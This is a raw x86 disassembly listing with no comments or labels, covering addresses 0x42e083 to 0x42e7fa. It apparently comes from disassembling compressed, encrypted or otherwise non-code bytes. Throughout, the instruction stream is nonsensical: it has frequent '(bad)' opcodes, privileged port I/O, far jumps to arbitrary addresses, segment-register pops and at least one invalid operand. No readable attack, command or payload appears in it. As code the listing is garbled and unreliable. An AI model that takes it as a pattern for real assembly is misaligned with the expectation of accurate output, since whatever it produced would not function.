  42e083:	lds    esp,FWORD PTR [ecx]
  42e085:	mov    bl,BYTE PTR [ebx]
  42e087:	or     BYTE PTR [ecx-0x15],bl
  42e08a:	add    esi,DWORD PTR [edx-0x5e]
  42e08d:	push   ebx
  42e08e:	add    eax,0xd62b390a
  42e093:	push   ds
  42e094:	das    
  42e095:	mov    ch,0x6a
  42e097:	add    DWORD PTR [ebx-0x3b],esp
  42e09a:	inc    esp
  42e09b:	mov    eax,ds:0xeaeda594
  42e0a0:	xor    eax,0x4ce37394
  42e0a5:	(bad)  
  42e0a6:	and    DWORD PTR [edx+0x47],ecx
  42e0a9:	test   al,0xc2
  42e0ab:	enter  0xa090,0x63
  42e0af:	jno    0x42e03d
  42e0b1:	fstp   QWORD PTR [ebx]
  42e0b3:	lea    ebx,[eax+edi*1]
  42e0b6:	cwde   
  42e0b7:	daa    
  42e0b8:	xchg   edi,eax
  42e0b9:	sub    ecx,esp
  42e0bb:	xor    dl,BYTE PTR [edi-0x47]
  42e0be:	in     eax,0x93
  42e0c0:	sbb    eax,0xd34bec2c
  42e0c5:	and    al,0xd6
  42e0c7:	jae    0x42e13a
  42e0c9:	dec    edx
  42e0ca:	jbe    0x42e123
  42e0cc:	xor    BYTE PTR fs:[ebx],bh
  42e0cf:	pop    edx
  42e0d0:	test   al,0x97
  42e0d2:	add    ebx,edi
  42e0d4:	aaa    
  42e0d5:	mov    eax,0x6f9bef1
  42e0da:	cld    
  42e0db:	aaa    
  42e0dc:	fild   WORD PTR [esi-0x37]
  42e0df:	fsubr  DWORD PTR [ebp+0x692517b5]
  42e0e5:	mov    eax,0x18b8278e
  42e0ea:	sbb    BYTE PTR [esi+0x3],dl
  42e0ed:	push   eax
  42e0ee:	push   ebp
  42e0ef:	mov    al,ds:0x53c8b55b
  42e0f4:	fstp   QWORD PTR [esp+edx*2+0xfca833d]
  42e0fb:	push   ecx
  42e0fc:	enter  0xd0cf,0xa2
  42e100:	pop    ds
  42e101:	iret   
  42e102:	stos   BYTE PTR es:[edi],al
  42e103:	cmp    eax,ebp
  42e105:	sub    dl,BYTE PTR [eax-0x2d]
  42e108:	dec    ebp
  42e109:	mov    ds:0x8b97bbb6,eax
  42e10e:	or     al,ah
  42e110:	jne    0x42e0ec
  42e112:	rol    ebx,1
  42e114:	leave  
  42e115:	aas    
  42e116:	xor    esi,esi
  42e118:	in     al,0x6f
  42e11a:	jno    0x42e194
  42e11c:	or     ecx,DWORD PTR [esi+edi*4-0x7e697988]
  42e123:	push   esi
  42e124:	pushf  
  42e125:	jge    0x42e1a4
  42e127:	cwde   
  42e128:	retf   0xd206
  42e12b:	mov    cl,0x39
  42e12d:	xchg   BYTE PTR [esi-0x19e4d3c5],bl
  42e133:	daa    
  42e134:	xchg   edi,eax
  42e135:	adc    BYTE PTR [eax+0x64],bl
  42e138:	enter  0xe372,0x91
  42e13c:	sbb    BYTE PTR [ebx+0x4f],dl
  42e13f:	in     eax,dx
  42e140:	xchg   esp,eax
  42e141:	inc    ebp
  42e142:	mov    esp,0xbfe9e487
  42e147:	daa    
  42e148:	xor    eax,0x9d6da063
  42e14d:	xchg   esi,eax
  42e14e:	in     eax,dx
  42e14f:	xor    eax,0x44b6254f
  42e154:	cmc    
  42e155:	test   DWORD PTR [ecx+0xa],ecx
  42e158:	ss daa 
  42e15a:	dec    esi
  42e15b:	pop    ecx
  42e15c:	les    ebp,FWORD PTR [ecx-0xcb4cd5f]
  42e162:	add    eax,0xc0b2395e
  42e167:	cli    
  42e168:	jo     0x42e128
  42e16a:	push   cs
  42e16b:	lea    eax,[edx]
  42e16d:	jmp    0x42e1ea
  42e16f:	or     BYTE PTR [edi+0x34],ch
  42e172:	arpl   WORD PTR [eax+0x747b19f9],si
  42e178:	sahf   
  42e179:	lods   al,BYTE PTR fs:[esi]
  42e17b:	les    ecx,FWORD PTR [ebp+0x2f14ecdf]
  42e181:	fwait
  42e182:	daa    
  42e183:	jle    0x42e15f
  42e185:	inc    eax
  42e186:	pop    esi
  42e187:	enter  0xe8f7,0xb3
  42e18b:	add    eax,0x1b85ab9c
  42e190:	xor    eax,0x891a98f9
  42e195:	jno    0x42e194
  42e197:	call   FWORD PTR [bp-0x70]
  42e19b:	enter  0x78ef,0x78
  42e19f:	iret   
  42e1a0:	cmp    al,BYTE PTR ds:[esi-0x2955673a]
  42e1a7:	jmp    0xf2af:0x375521c1
  42e1ae:	mov    ds:0xbe2bf295,al
  42e1b3:	scas   eax,DWORD PTR es:[edi]
  42e1b4:	ins    DWORD PTR es:[edi],dx
  42e1b5:	repnz aas 
  42e1b7:	mov    esp,0x7e6649fa
  42e1bc:	jle    0x42e14a
  42e1be:	enter  0x1485,0x4d
  42e1c2:	and    bh,BYTE PTR [eax-0x27]
  42e1c5:	push   edx
  42e1c6:	test   DWORD PTR [esi+edi*4-0x7e],esp
  42e1ca:	dec    ecx
  42e1cb:	xchg   esp,eax
  42e1cc:	aas    
  42e1cd:	sub    DWORD PTR [ebx],ebx
  42e1cf:	aad    0xdd
  42e1d1:	jmp    0x73744b9c
  42e1d6:	jl     0x42e210
  42e1d8:	dec    esi
  42e1d9:	pop    eax
  42e1da:	mov    WORD PTR [ebx-0x4b5b9935],es
  42e1e0:	nop
  42e1e1:	and    al,0x99
  42e1e3:	enter  0xf831,0x5f
  42e1e7:	ja     0x42e24c
  42e1e9:	lock jne 0x42e21d
  42e1ec:	jnp    0x42e1d6
  42e1ee:	cmp    BYTE PTR [esi],ah
  42e1f0:	fisttp DWORD PTR [ecx-0x36]
  42e1f3:	mov    bl,0xa7
  42e1f5:	pop    ecx
  42e1f6:	js     0x42e261
  42e1f8:	mov    eax,ds:0x2ac4343e
  42e1fd:	pop    esi
  42e1fe:	mov    al,ds:0xcf91ad18
  42e203:	or     dh,BYTE PTR [esp+ebx*2]
  42e206:	ja     0x42e221
  42e208:	xchg   ah,ch
  42e20a:	or     al,0xce
  42e20c:	mov    al,0xac
  42e20e:	cdq    
  42e20f:	js     0x42e24c
  42e211:	fild   QWORD PTR [edx+0x59]
  42e214:	gs stos DWORD PTR es:[edi],eax
  42e216:	popf   
  42e217:	fldcw  WORD PTR [ebx+0x7e]
  42e21a:	mov    ebx,0xeab7647c
  42e21f:	inc    ebx
  42e220:	sbb    esi,DWORD PTR [ecx]
  42e222:	gs pushf 
  42e224:	les    ebx,FWORD PTR [ebx-0x64]
  42e227:	sbb    al,0xfd
  42e229:	shl    DWORD PTR [ebx-0x35],1
  42e22c:	push   ds
  42e22d:	ins    BYTE PTR es:[edi],dx
  42e22e:	push   esi
  42e22f:	pop    ss
  42e230:	push   0xbcaee795
  42e235:	mov    ah,0xea
  42e237:	shl    BYTE PTR [ebx-0x57d562fe],1
  42e23d:	push   edi
  42e23e:	mov    al,ds:0xa0bcd2d1
  42e243:	jnp    0x42e284
  42e245:	adc    eax,0x2dc55210
  42e24a:	stos   BYTE PTR es:[edi],al
  42e24b:	pop    ecx
  42e24c:	dec    eax
  42e24d:	ins    DWORD PTR es:[edi],dx
  42e24e:	lds    edi,FWORD PTR [edx+0x24]
  42e251:	je     0x42e1f8
  42e253:	jmp    0xa47733f8
  42e258:	adc    BYTE PTR [esi-0x4c52e58a],0x54
  42e25f:	ins    BYTE PTR es:[edi],dx
  42e260:	inc    eax
  42e261:	and    DWORD PTR [esi],ecx
  42e263:	fwait
  42e264:	out    dx,al
  42e265:	sub    al,0x54
  42e267:	inc    eax
  42e268:	push   ebp
  42e269:	xor    eax,0xe794d107
  42e26e:	sbb    bh,BYTE PTR ds:0x7bde56e2
  42e274:	or     edi,DWORD PTR [ecx+0x5a3266c5]
  42e27a:	out    0xe7,al
  42e27c:	or     DWORD PTR [eax-0x7ae8ecc8],0x7e678144
  42e286:	cmp    eax,0x9dbb5f42
  42e28b:	test   eax,0xa7645144
  42e290:	dec    edx
  42e291:	and    al,0x51
  42e293:	and    bl,BYTE PTR [ebx+0x532171cd]
  42e299:	mov    ds:0x7d955ecb,eax
  42e29e:	adc    BYTE PTR [esi+eiz*8-0x4f],dh
  42e2a2:	shl    esp,cl
  42e2a4:	adc    cl,BYTE PTR [edx+0x20]
  42e2a7:	sti    
  42e2a8:	loope  0x42e317
  42e2aa:	jbe    0x42e25c
  42e2ac:	jmp    0x574483c7
  42e2b1:	ja     0x42e304
  42e2b3:	sub    DWORD PTR [edx+edx*2],ecx
  42e2b6:	mov    esp,0x5eccdbe4
  42e2bb:	ja     0x42e2ca
  42e2bd:	stos   DWORD PTR es:[edi],eax
  42e2be:	(bad)  
  42e2bf:	jmp    0xc71edf21
  42e2c4:	not    esi
  42e2c6:	and    ecx,esi
  42e2c8:	cmp    dh,0xae
  42e2cb:	adc    edi,esp
  42e2cd:	cmc    
  42e2ce:	in     al,dx
  42e2cf:	mov    BYTE PTR [eax],bl
  42e2d1:	lea    edi,[eax+eax*1]
  42e2d4:	xchg   edi,eax
  42e2d5:	(bad)  
  42e2d6:	mov    ebp,0xf19d069b
  42e2db:	jmp    0x42e2ac
  42e2dd:	in     eax,dx
  42e2de:	ror    BYTE PTR ds:0x9b1ef685,cl
  42e2e4:	aas    
  42e2e5:	sub    eax,0xd76df608
  42e2ea:	adc    BYTE PTR [ebx],bh
  42e2ec:	xor    eax,0x66daf344
  42e2f1:	es sahf 
  42e2f3:	cmp    al,0x41
  42e2f5:	imul   ebp,DWORD PTR [esi],0x8e24df8b
  42e2fb:	call   0x7f69e38a
  42e300:	xor    DWORD PTR [edi-0x5],eax
  42e303:	ins    DWORD PTR es:[edi],dx
  42e304:	cmp    eax,0x245cbab8
  42e309:	popw   ss
  42e30b:	jo     0x42e346
  42e30d:	mov    esp,0xd13933e4
  42e312:	test   DWORD PTR [ecx+eiz*4],edi
  42e315:	in     eax,dx
  42e316:	inc    edx
  42e317:	pop    ebx
  42e318:	pop    edi
  42e319:	mov    edx,DWORD PTR [ebx]
  42e31b:	cmp    DWORD PTR [ebp-0x1874dee0],ebx
  42e321:	imul   esi,DWORD PTR [esi],0xffffffd6
  42e324:	pop    es
  42e325:	loopne 0x42e2fb
  42e327:	adc    edi,DWORD PTR [ebx+0x6eacb226]
  42e32d:	ja     0x42e39f
  42e32f:	fxch   st(5)
  42e331:	sub    eax,0x7af9e3e4
  42e336:	xchg   edx,eax
  42e337:	push   eax
  42e338:	dec    ebp
  42e339:	push   ss
  42e33a:	jo     0x42e31e
  42e33c:	cdq    
  42e33d:	and    al,0x7d
  42e33f:	dec    ebp
  42e340:	push   es
  42e341:	in     al,dx
  42e342:	mov    bl,0x5
  42e344:	ins    BYTE PTR es:[edi],dx
  42e345:	dec    ebp
  42e346:	jle    0x42e30a
  42e348:	aas    
  42e349:	(bad)  
  42e34a:	pop    edi
  42e34b:	aam    0xba
  42e34d:	pop    esi
  42e34e:	daa    
  42e34f:	mov    dl,0xfa
  42e351:	outs   dx,BYTE PTR ds:[esi]
  42e352:	pop    ecx
  42e353:	(bad)  
  42e355:	fsubr  DWORD PTR [ebx]
  42e357:	sbb    edi,DWORD PTR [eax-0x44]
  42e35a:	ficom  DWORD PTR [eax+0x51fa7505]
  42e360:	aad    0xdf
  42e362:	outs   dx,DWORD PTR ds:[esi]
  42e363:	in     eax,0x4c
  42e365:	or     BYTE PTR [ebp+0x3872a9d5],dl
  42e36b:	adc    al,0x12
  42e36d:	test   al,0x57
  42e36f:	add    ebp,DWORD PTR [edx-0x2fad132]
  42e375:	lds    ecx,FWORD PTR ds:0x551c5234
  42e37b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e37d:	dec    esi
  42e37e:	add    DWORD PTR [esi-0x6e1c7125],ebp
  42e384:	lahf   
  42e385:	xor    DWORD PTR [edi-0x1a],edi
  42e388:	jns    0x42e35c
  42e38a:	addr16 pop edi
  42e38c:	fs pop eax
  42e38e:	or     al,0x40
  42e390:	jae    0x42e409
  42e392:	mov    BYTE PTR [esi+0x6161af9b],bh
  42e398:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e39a:	rol    BYTE PTR [edx],1
  42e39c:	xchg   DWORD PTR [eax+esi*2],ebp
  42e39f:	push   ebp
  42e3a0:	xchg   esp,eax
  42e3a1:	cmp    al,0x4e
  42e3a3:	jmp    0x42e39f
  42e3a5:	and    al,0x7e
  42e3a7:	imul   edx,DWORD PTR [edx-0x5d3ba86a],0x7f
  42e3ae:	in     al,0x5d
  42e3b0:	repnz sar BYTE PTR [edi+0x4f],1
  42e3b4:	jp     0x42e3a7
  42e3b6:	retf   
  42e3b7:	sbb    BYTE PTR [edx+0x45cfe626],ch
  42e3bd:	sub    ecx,ecx
  42e3bf:	es (bad) 
  42e3c2:	jnp    0x42e35e
  42e3c4:	outs   dx,BYTE PTR ds:[esi]
  42e3c5:	jg     0x42e34d
  42e3c7:	mov    esp,0xa26f13d6
  42e3cc:	test   cl,dl
  42e3ce:	push   0xc0ae7e64
  42e3d3:	mov    cl,0x23
  42e3d5:	dec    ecx
  42e3d6:	jbe    0x42e436
  42e3d8:	out    0xa2,al
  42e3da:	dec    edi
  42e3db:	mov    eax,0xd7dbeb72
  42e3e0:	aam    0xbb
  42e3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3e3:	cwde   
  42e3e4:	dec    esp
  42e3e5:	cmp    eax,0xc21183f8
  42e3ea:	cmp    ebx,DWORD PTR [ebx+0x29]
  42e3ed:	mov    eax,edi
  42e3ef:	cmp    eax,0x6279a7ff
  42e3f4:	arpl   WORD PTR [ebp+0x3a],sp
  42e3f7:	jbe    0x42e3b2
  42e3f9:	pop    ecx
  42e3fa:	cmp    BYTE PTR [edx-0x3c112e39],dl
  42e400:	aad    0x1b
  42e402:	xor    DWORD PTR es:[ecx+0x60],ebx
  42e406:	repz jnp 0x42e3e8
  42e409:	cmp    BYTE PTR [ebp+0x6c8f2369],0x7f
  42e410:	(bad)  
  42e412:	test   eax,0x53e70b38
  42e417:	cmc    
  42e418:	or     bh,BYTE PTR [edx]
  42e41a:	xor    eax,0x6fa2321c
  42e41f:	in     al,dx
  42e420:	adc    cl,BYTE PTR [ebp-0x1025e9da]
  42e426:	pop    edx
  42e427:	mov    al,ds:0xdee7c3f3
  42e42c:	dec    ebx
  42e42d:	test   BYTE PTR [edx+ebx*4-0x17],0xd4
  42e432:	sbb    al,0xc1
  42e434:	ins    DWORD PTR es:[edi],dx
  42e435:	lods   al,BYTE PTR ds:[esi]
  42e437:	inc    edx
  42e438:	inc    edi
  42e439:	jge    0x22d0
  42e43e:	xchg   ebp,eax
  42e43f:	lds    esi,FWORD PTR [ebp-0x42463e18]
  42e445:	add    eax,0x38478f43
  42e44a:	dec    BYTE PTR [ecx]
  42e44c:	push   edx
  42e44d:	xor    BYTE PTR [ebx],0x7b
  42e450:	xlat   BYTE PTR ds:[ebx]
  42e451:	xor    al,0x11
  42e453:	mov    esi,0xff654ac1
  42e458:	sbb    ch,BYTE PTR [edx]
  42e45a:	aaa    
  42e45b:	pop    esp
  42e45c:	test   ecx,ecx
  42e45e:	in     al,dx
  42e45f:	arpl   cx,bp
  42e461:	les    edx,FWORD PTR [ebx-0x1c]
  42e464:	repnz sub DWORD PTR [esi-0x3d3d400a],esp
  42e46b:	icebp  
  42e46c:	imul   edi,edx,0x9bbc5543
  42e472:	mov    ebp,0x582d6d64
  42e477:	pushf  
  42e478:	cmp    esp,DWORD PTR [ebp-0x3f]
  42e47b:	jecxz  0x42e43f
  42e47d:	adc    DWORD PTR ds:0xe2f395c2,eax
  42e483:	test   eax,0x8557784a
  42e488:	inc    ebp
  42e489:	or     bl,0x8c
  42e48c:	cmp    al,0x39
  42e48e:	dec    ebp
  42e48f:	jmp    0x42e4cb
  42e491:	pop    ds
  42e492:	ins    DWORD PTR es:[edi],dx
  42e493:	push   edi
  42e494:	out    dx,al
  42e495:	nop
  42e496:	dec    ebp
  42e497:	adc    BYTE PTR [ebx-0x47ae14d9],ah
  42e49d:	jmp    0x42e4ae
  42e49f:	sbb    al,0x7d
  42e4a1:	mul    al
  42e4a3:	repnz push es
  42e4a5:	iret   
  42e4a6:	call   0x6fe61cc6
  42e4ab:	out    0xa2,al
  42e4ad:	cs mov al,0x2b
  42e4b0:	pop    ebx
  42e4b1:	sub    BYTE PTR [ecx-0x18ac316],0xab
  42e4b8:	mov    ds:0x30ba4bda,al
  42e4bd:	stos   DWORD PTR es:[edi],eax
  42e4be:	xchg   ebx,eax
  42e4bf:	nop
  42e4c0:	xchg   ebp,eax
  42e4c1:	int    0x2e
  42e4c3:	push   esp
  42e4c4:	mov    edi,0x448d3f00
  42e4c9:	cdq    
  42e4ca:	cwde   
  42e4cb:	outs   dx,BYTE PTR ds:[esi]
  42e4cc:	adc    BYTE PTR [eax*4+0x2ac4a550],dl
  42e4d3:	push   ds
  42e4d4:	mov    al,ds:0x3a550f8e
  42e4d9:	mov    ch,0xf2
  42e4db:	scas   al,BYTE PTR es:[edi]
  42e4dc:	pop    ebp
  42e4dd:	xor    al,0x68
  42e4df:	shl    DWORD PTR [eax-0x2b21ab12],0xc2
  42e4e6:	bnd jg 0x42e4ce
  42e4e9:	xchg   ebx,eax
  42e4ea:	lahf   
  42e4eb:	adc    eax,0xdce064c0
  42e4f0:	ret    
  42e4f1:	addr16 cwde 
  42e4f3:	cmp    edx,DWORD PTR [edi+0x5adb92e0]
  42e4f9:	mov    BYTE PTR [ebp+0x7fb0b967],cl
  42e4ff:	mov    fs,WORD PTR [esp+edi*4-0x3e]
  42e503:	test   DWORD PTR [eax-0x6f],ecx
  42e506:	sbb    eax,0xa7c6367d
  42e50b:	mov    bl,0x1c
  42e50d:	popf   
  42e50e:	dec    edx
  42e50f:	jb     0x42e58a
  42e511:	(bad)  
  42e512:	mov    ecx,DWORD PTR [ebx]
  42e514:	dec    ebx
  42e515:	cmp    esp,edi
  42e517:	jbe    0x42e544
  42e519:	out    0x97,eax
  42e51b:	sub    bh,BYTE PTR [eax]
  42e51d:	in     al,0x25
  42e51f:	xlat   BYTE PTR ds:[ebx]
  42e520:	ja     0x42e59c
  42e522:	les    ecx,FWORD PTR [ecx]
  42e524:	or     DWORD PTR [edx+0x48],ecx
  42e527:	out    0xb8,al
  42e529:	in     al,dx
  42e52a:	and    ebp,DWORD PTR [ebp+0x49f35ef4]
  42e530:	xchg   ecx,eax
  42e531:	xchg   ecx,eax
  42e532:	inc    edi
  42e533:	xor    BYTE PTR [esi+edx*8+0x60],dl
  42e537:	sub    BYTE PTR [ebp-0x31],bl
  42e53a:	pop    DWORD PTR [edx+0x7b]
  42e53d:	xchg   esi,eax
  42e53e:	sbb    eax,DWORD PTR [edx+0x1aaaef6a]
  42e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e545:	stos   BYTE PTR es:[edi],al
  42e546:	lods   al,BYTE PTR ds:[esi]
  42e547:	dec    eax
  42e548:	xchg   ebp,eax
  42e549:	push   cs
  42e54a:	scas   al,BYTE PTR es:[edi]
  42e54b:	jb     0x42e58b
  42e54d:	sub    bh,BYTE PTR [edx+0x531e5001]
  42e553:	xor    eax,0xe7d50f8
  42e558:	mov    dh,0xbc
  42e55a:	xor    eax,0x1f2bf18c
  42e55f:	and    dh,BYTE PTR [esi-0x20]
  42e562:	sub    cl,bh
  42e564:	inc    esp
  42e565:	xchg   edx,eax
  42e566:	sar    BYTE PTR [edx-0x1cec6ed0],1
  42e56c:	pop    eax
  42e56d:	lds    ecx,FWORD PTR [ebx+0x65]
  42e570:	dec    esi
  42e571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e572:	push   0x3d5566bb
  42e577:	add    BYTE PTR [eax+0x8e34c5a],bl
  42e57d:	cmp    BYTE PTR [eax],ch
  42e57f:	or     DWORD PTR [edx],esp
  42e581:	je     0x42e5b7
  42e583:	fwait
  42e584:	sub    DWORD PTR [esi-0x2cbb217c],esp
  42e58a:	sbb    BYTE PTR [ebp+0x35],ch
  42e58d:	cmp    ch,BYTE PTR [edi]
  42e58f:	mov    bh,0xf3
  42e591:	call   0xfdf3353d
  42e596:	mov    ?,WORD PTR [esi]
  42e598:	fsubr  QWORD PTR ds:0x7fb99e15
  42e59e:	mov    edi,edx
  42e5a0:	fucomp st(0)
  42e5a2:	loope  0x42e5db
  42e5a4:	mov    edi,0x8f63679d
  42e5a9:	xchg   ebx,eax
  42e5aa:	mov    dh,0x9d
  42e5ac:	sub    eax,0xdc495c04
  42e5b1:	jle    0x42e626
  42e5b3:	mov    ebp,0x93fcfa34
  42e5b8:	xor    DWORD PTR [ecx+ecx*4],edi
  42e5bb:	sbb    bl,BYTE PTR [ebx-0x21]
  42e5be:	popa   
  42e5bf:	mov    ds:0xf3c0ed58,eax
  42e5c4:	scas   al,BYTE PTR es:[edi]
  42e5c5:	pop    ebx
  42e5c6:	fs sub esi,0xffffffc0
  42e5ca:	cmp    al,0xbe
  42e5cc:	xchg   ebp,eax
  42e5cd:	loope  0x42e5ad
  42e5cf:	mov    ecx,DWORD PTR [ebp+0x36c33471]
  42e5d5:	inc    edi
  42e5d6:	and    esp,esi
  42e5d8:	mov    eax,ds:0xf655c34a
  42e5dd:	imul   edx,DWORD PTR [edi+ebx*8+0x73],0x55
  42e5e2:	iret   
  42e5e3:	mov    ds:0xa655368e,al
  42e5e8:	ins    BYTE PTR es:[edi],dx
  42e5e9:	mov    ebp,0xfe829825
  42e5ee:	sub    ah,BYTE PTR [ebx]
  42e5f0:	sub    al,0xa0
  42e5f2:	or     eax,DWORD PTR [edx+0x2daa729a]
  42e5f8:	test   dh,dl
  42e5fa:	(bad)  
  42e5fc:	shl    BYTE PTR [edi],cl
  42e5fe:	pop    edi
  42e5ff:	xchg   ebp,ebp
  42e601:	xlat   BYTE PTR ds:[ebx]
  42e602:	aas    
  42e603:	push   ss
  42e604:	pop    eax
  42e605:	mov    bl,0x44
  42e607:	hlt    
  42e608:	loopne 0x42e5d9
  42e60a:	sub    ah,al
  42e60c:	add    eax,0xf2f7889e
  42e611:	hlt    
  42e612:	pop    esp
  42e613:	es sbb al,0xed
  42e616:	test   al,0x18
  42e618:	xor    BYTE PTR [ecx+0x6c],0xb6
  42e61c:	sub    eax,DWORD PTR [esi+eax*1]
  42e61f:	pop    ebp
  42e620:	int3   
  42e621:	ror    BYTE PTR [edi+0x1c],0x7f
  42e625:	test   dh,dh
  42e627:	or     DWORD PTR [ebx],ebp
  42e629:	mov    bl,BYTE PTR [ecx+0x2924]
  42e62f:	pushf  
  42e630:	fimul  DWORD PTR [ecx+0x44]
  42e633:	inc    ecx
  42e634:	push   esp
  42e635:	mov    DWORD PTR [edi-0x72a7b24],ecx
  42e63b:	dec    esi
  42e63c:	adc    ah,bh
  42e63e:	jg     0x42e660
  42e640:	nop
  42e641:	mov    bh,0x44
  42e643:	push   0xffffffb2
  42e645:	cmp    BYTE PTR [ecx+0x2da12698],0x56
  42e64c:	xor    eax,0xa197264b
  42e651:	addr16 popf 
  42e653:	popf   
  42e654:	mov    eax,ds:0x2d023923
  42e659:	push   esi
  42e65a:	jp     0x42e6b2
  42e65c:	aaa    
  42e65d:	xor    DWORD PTR [ebx+0x3a312364],esi
  42e663:	dec    ebx
  42e664:	mov    esp,0x8feecf38
  42e669:	aad    0xf0
  42e66b:	cmp    DWORD PTR [ebx],edi
  42e66d:	test   eax,0x4e2c4b64
  42e672:	push   cs
  42e673:	mov    BYTE PTR [edi+0xd],dh
  42e676:	xchg   ecx,eax
  42e677:	lahf   
  42e678:	jl     0x42e6d8
  42e67a:	jbe    0x42e630
  42e67c:	inc    esp
  42e67d:	xor    DWORD PTR [edi+0x64],ebp
  42e680:	imul   esi,DWORD PTR [edx+eax*4+0x3bcefe47],0x9785c2d0
  42e68b:	out    0xd8,al
  42e68d:	cli    
  42e68e:	fidivr WORD PTR [esi]
  42e690:	pop    edx
  42e691:	pop    es
  42e692:	mov    edi,0xff23d8ca
  42e697:	inc    esp
  42e698:	cli    
  42e699:	pop    es
  42e69a:	inc    ebx
  42e69b:	inc    esp
  42e69c:	test   BYTE PTR [esi],0x2d
  42e69f:	rol    DWORD PTR [eax],cl
  42e6a1:	xchg   ebp,eax
  42e6a2:	fsub   QWORD PTR [edx-0x1de1c37]
  42e6a8:	jp     0x42e62a
  42e6aa:	test   esi,esi
  42e6ac:	into   
  42e6ad:	pop    ds
  42e6ae:	lahf   
  42e6af:	cli    
  42e6b0:	add    cl,bh
  42e6b2:	test   eax,0x9b5b94f5
  42e6b7:	mov    DWORD PTR [edi+0x75a448ff],ecx
  42e6bd:	inc    edx
  42e6be:	test   BYTE PTR [ebx+0x2d],dh
  42e6c1:	fstp   DWORD PTR [eax+0x0]
  42e6c4:	mov    ebx,0x6f7347d7
  42e6c9:	xor    edi,DWORD PTR [ecx-0x7f]
  42e6cc:	test   al,0x85
  42e6ce:	dec    eax
  42e6cf:	mov    dl,al
  42e6d1:	(bad)  
  42e6d2:	push   ebp
  42e6d3:	mov    dl,0x78
  42e6d5:	(bad)  
  42e6d6:	cmp    ah,dl
  42e6d8:	dec    ecx
  42e6d9:	mov    WORD PTR [edx+eiz*2],ds
  42e6dc:	icebp  
  42e6dd:	mov    ah,0x70
  42e6df:	mov    ebx,0x9eddc24d
  42e6e4:	lahf   
  42e6e5:	mov    eax,ds:0xc933436b
  42e6ea:	jmp    0x4e90fb52
  42e6ef:	mov    DWORD PTR [ebp+0x17],eax
  42e6f2:	inc    ecx
  42e6f3:	repnz sbb DWORD PTR [ecx+0x2a4ef5bf],esi
  42e6fa:	or     DWORD PTR [edi],ecx
  42e6fc:	in     eax,0xa5
  42e6fe:	pop    ecx
  42e6ff:	pop    edx
  42e700:	jbe    0x42e6b7
  42e702:	nop
  42e703:	pop    ecx
  42e704:	dec    eax
  42e705:	adc    DWORD PTR [ecx],edi
  42e707:	adc    eax,ecx
  42e709:	sbb    eax,0xe118116
  42e70e:	cdq    
  42e70f:	sbb    dl,BYTE PTR ds:0xded62bee
  42e715:	rcr    ecx,1
  42e717:	dec    esp
  42e718:	js     0x42e711
  42e71a:	fwait
  42e71b:	mov    al,0x5b
  42e71d:	pop    esi
  42e71e:	test   eax,0xdb37caf7
  42e723:	add    eax,0x6fc6f2a
  42e728:	(bad)  
  42e729:	daa    
  42e72a:	sbb    esi,DWORD PTR [ebx-0x1]
  42e72d:	(bad)  
  42e72e:	push   0x94d6f2b4
  42e733:	ja     0x42e6b9
  42e735:	push   es
  42e736:	pushf  
  42e737:	push   edi
  42e738:	daa    
  42e739:	sbb    DWORD PTR [edx],ebp
  42e73b:	ins    DWORD PTR es:[edi],dx
  42e73c:	push   edi
  42e73d:	popf   
  42e73e:	lock test al,0xd8
  42e741:	xchg   DWORD PTR [ecx+0x7f],eax
  42e744:	pop    edi
  42e745:	jne    0x42e759
  42e747:	mov    ds:0xfa625f12,al
  42e74c:	pop    esi
  42e74d:	stos   DWORD PTR es:[edi],eax
  42e74e:	sbb    dl,al
  42e750:	sub    BYTE PTR [esi],0x3
  42e753:	call   0xc9503a9e
  42e758:	je     0x42e743
  42e75a:	mov    edi,0x72393caf
  42e75f:	scas   al,BYTE PTR es:[edi]
  42e760:	js     0x42e700
  42e762:	dec    ebx
  42e763:	je     0x42e768
  42e765:	mov    al,ds:0x7c8363dd
  42e76a:	mov    ebp,0x89176553
  42e76f:	(bad)  
  42e770:	push   ebp
  42e771:	xchg   esi,eax
  42e772:	sahf   
  42e773:	and    edi,edi
  42e775:	xchg   edi,eax
  42e776:	das    
  42e777:	adc    esi,ebx
  42e779:	ins    BYTE PTR es:[edi],dx
  42e77a:	loopne 0x42e73c
  42e77c:	mov    edi,0x12717abd
  42e781:	xchg   esp,eax
  42e782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e783:	mov    al,0x76
  42e786:	aas    
  42e787:	mov    bl,0xc7
  42e789:	xchg   ebx,eax
  42e78a:	dec    esp
  42e78b:	dec    esp
  42e78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e78d:	xor    DWORD PTR [ecx],ebx
  42e78f:	dec    esp
  42e790:	js     0x42e73f
  42e792:	gs or  al,0xe5
  42e795:	adc    ch,BYTE PTR [edi]
  42e797:	sahf   
  42e798:	dec    ebx
  42e799:	mov    bl,0x26
  42e79b:	pusha  
  42e79c:	es pop edx
  42e79e:	test   al,0x9
  42e7a0:	add    ch,BYTE PTR [eax+0x60b40d0a]
  42e7a6:	mov    al,0x54
  42e7a8:	sbb    ah,ch
  42e7aa:	jbe    0x42e7dd
  42e7ac:	ss cdq 
  42e7ae:	ret    
  42e7af:	sub    eax,0x2eed6c34
  42e7b4:	pcmpeqd mm3,QWORD PTR [edi-0x80]
  42e7b8:	xchg   esi,eax
  42e7b9:	sbb    eax,0xddefe0b7
  42e7be:	mov    al,bh
  42e7c0:	fwait
  42e7c1:	in     eax,0xa7
  42e7c3:	int    0x77
  42e7c5:	aam    0x9f
  42e7c7:	jg     0x42e755
  42e7c9:	inc    esi
  42e7ca:	sbb    al,0x25
  42e7cc:	stos   DWORD PTR es:[edi],eax
  42e7cd:	mov    edi,0x24ae9b63
  42e7d2:	jmp    0x8353:0x818d5398
  42e7d9:	cmp    eax,0xeaa631d5
  42e7de:	push   0xffffffd4
  42e7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e7e1:	dec    ebp
  42e7e2:	sbb    ebp,0x5be31ab5
  42e7e8:	(bad)  
  42e7e9:	bound  ebx,QWORD PTR [eax+0x15320829]
  42e7ef:	das    
  42e7f0:	lods   eax,DWORD PTR ds:[esi]
  42e7f1:	adc    eax,0x8174bd7c
  42e7f6:	pusha  
  42e7f7:	pop    eax
  42e7f8:	xchg   esp,eax
  42e7f9:	push   ebx
  42e7fa:	push   ss
